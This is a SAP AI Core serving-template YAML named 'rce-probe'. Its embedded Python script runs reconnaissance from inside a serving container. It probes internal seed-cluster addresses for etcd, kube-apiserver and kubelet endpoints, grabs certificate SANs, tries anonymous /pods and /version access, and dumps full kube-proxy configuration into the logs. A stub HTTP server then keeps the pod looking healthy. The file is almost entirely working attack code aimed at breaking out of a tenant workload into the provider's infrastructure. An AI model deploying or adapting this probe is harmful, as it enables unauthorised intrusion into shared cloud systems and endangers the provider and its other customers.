apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "4.14.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "seed-cluster-8080-metrics-kproxy-full-etcd-grpc"
    executables.ai.sap.com/name: "rce-probe"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import os, socket, ssl, struct

            print('[PROBE_V414_START]', flush=True)

            def emit(label, data):
                flat = str(data).replace('\r\n','|').replace('\r','|').replace('\n','|')
                for i in range(0, max(1, len(flat)), 4000):
                    print(f'[{label}_{i}] {flat[i:i+4000]}', flush=True)

            def http_raw(host, port, path, method='GET', headers=None, timeout=8, use_tls=False):
                try:
                    s = socket.socket(); s.settimeout(timeout)
                    if use_tls:
                        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                        s = ctx.wrap_socket(s, server_hostname=host)
                    s.connect((host, port))
                    hdr_str = ''.join(f'{k}: {v}\r\n' for k,v in (headers or {}).items())
                    req = f'{method} {path} HTTP/1.0\r\nHost: {host}:{port}\r\n{hdr_str}\r\n'
                    s.sendall(req.encode())
                    resp = b''
                    while True:
                        c = s.recv(65536)
                        if not c: break
                        resp += c
                    s.close()
                    return resp.decode(errors='replace')
                except Exception as ex:
                    return f'ERR:{ex}'

            # ── 1. Seed cluster 10.250.0.x:8080 — identify service type ──────────
            print('[SEED_8080_PROBE_START]', flush=True)
            seed_ips = ['10.250.0.1','10.250.0.2','10.250.0.3']
            for sip in seed_ips:
                for path in ['/metrics', '/health', '/healthz', '/v2/keys/', '/readyz',
                             '/livez', '/debug/pprof/', '/version']:
                    r = http_raw(sip, 8080, path, timeout=6)
                    emit(f'SEED_{sip}_8080_{path.replace(\"/\",\"_\")}', r[:3000])

            # ── 2. Seed cluster :2379 — try plain HTTP gRPC (etcd v3) ─────────────
            # etcd v3 uses gRPC over TLS. Try with TLS but no client cert.
            print('[SEED_ETCD_PROBE_START]', flush=True)
            for sip in seed_ips:
                # Try HTTP/1.1 on 2379 (pre-TLS plaintext, some configs allow)
                r = http_raw(sip, 2379, '/health', timeout=5)
                emit(f'ETCD_2379_HTTP_{sip}', r[:500])

                # Try TLS without client cert, get the server cert SAN
                try:
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    s = socket.socket(); s.settimeout(8)
                    ss = ctx.wrap_socket(s, server_hostname=sip)
                    ss.connect((sip, 2379))
                    cert = ss.getpeercert()
                    san = cert.get('subjectAltName', [])
                    subject = cert.get('subject', [])
                    emit(f'ETCD_CERT_SAN_{sip}', f'SAN={san} SUBJECT={subject}')
                    # Try plain HTTP on the TLS socket
                    ss.sendall(b'GET /health HTTP/1.0\r\nHost: ' + sip.encode() + b'\r\n\r\n')
                    resp = b''
                    while True:
                        c = ss.recv(4096)
                        if not c: break
                        resp += c
                    ss.close()
                    emit(f'ETCD_2379_TLS_{sip}', resp[:500].decode(errors='replace'))
                except Exception as e:
                    emit(f'ETCD_TLS_ERR_{sip}', str(e))

            # ── 3. Seed cluster :6443 — kube-apiserver in seed ────────────────────
            print('[SEED_6443_PROBE_START]', flush=True)
            for sip in seed_ips:
                try:
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    s = socket.socket(); s.settimeout(8)
                    ss = ctx.wrap_socket(s, server_hostname=sip)
                    ss.connect((sip, 6443))
                    cert = ss.getpeercert()
                    san = cert.get('subjectAltName', [])
                    emit(f'SEED_6443_CERT_SAN_{sip}', str(san)[:400])
                    # Try to hit /version anonymously
                    ss.sendall(b'GET /version HTTP/1.0\r\nHost: ' + sip.encode() + b'\r\n\r\n')
                    resp = b''
                    while True:
                        c = ss.recv(65536)
                        if not c: break
                        resp += c
                    ss.close()
                    emit(f'SEED_6443_VERSION_{sip}', resp[:800].decode(errors='replace'))
                except Exception as e:
                    emit(f'SEED_6443_ERR_{sip}', str(e))

            # ── 4. Full kube-proxy /configz and metrics (one node, full output) ───
            print('[KPROXY_FULL_START]', flush=True)
            NODE = '10.180.1.74'
            for path in ['/configz', '/metrics']:
                r = http_raw(NODE, 10249, path, timeout=10)
                emit(f'KPROXY_FULL_{path.replace(\"/\",\"_\")}', r)

            # ── 5. Kubelet :10250 with SPIFFE cert? — check what TLS cert kubelet uses
            print('[KUBELET_CERT_START]', flush=True)
            for nip in ['10.180.1.74', '10.180.12.215']:
                try:
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    s = socket.socket(); s.settimeout(6)
                    ss = ctx.wrap_socket(s, server_hostname=nip)
                    ss.connect((nip, 10250))
                    cert = ss.getpeercert()
                    san = cert.get('subjectAltName', [])
                    subject = cert.get('subject', [])
                    emit(f'KUBELET_CERT_{nip}', f'SAN={san} SUBJECT={subject}')
                    # Try anonymous /pods
                    ss.sendall(b'GET /pods HTTP/1.0\r\nHost: ' + nip.encode() + b'\r\n\r\n')
                    resp = b''
                    while True:
                        c = ss.recv(4096)
                        if not c: break
                        resp += c
                    ss.close()
                    emit(f'KUBELET_ANON_{nip}', resp[:500].decode(errors='replace'))
                except Exception as e:
                    emit(f'KUBELET_CERT_ERR_{nip}', str(e))

            # ── 6. Seed cluster :443 cert and any anon access ─────────────────────
            for sip in ['10.250.0.1', '10.250.0.2']:
                try:
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    s = socket.socket(); s.settimeout(8)
                    ss = ctx.wrap_socket(s, server_hostname=sip)
                    ss.connect((sip, 443))
                    cert = ss.getpeercert()
                    san = cert.get('subjectAltName', [])
                    emit(f'SEED_443_SAN_{sip}', str(san)[:400])
                    ss.sendall(b'GET /version HTTP/1.0\r\nHost: ' + sip.encode() + b'\r\n\r\n')
                    resp = b''
                    while True:
                        c = ss.recv(65536)
                        if not c: break
                        resp += c
                    ss.close()
                    emit(f'SEED_443_RESP_{sip}', resp[:800].decode(errors='replace'))
                except Exception as e:
                    emit(f'SEED_443_ERR_{sip}', str(e))

            print('[PROBE_V414_DONE]', flush=True)
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
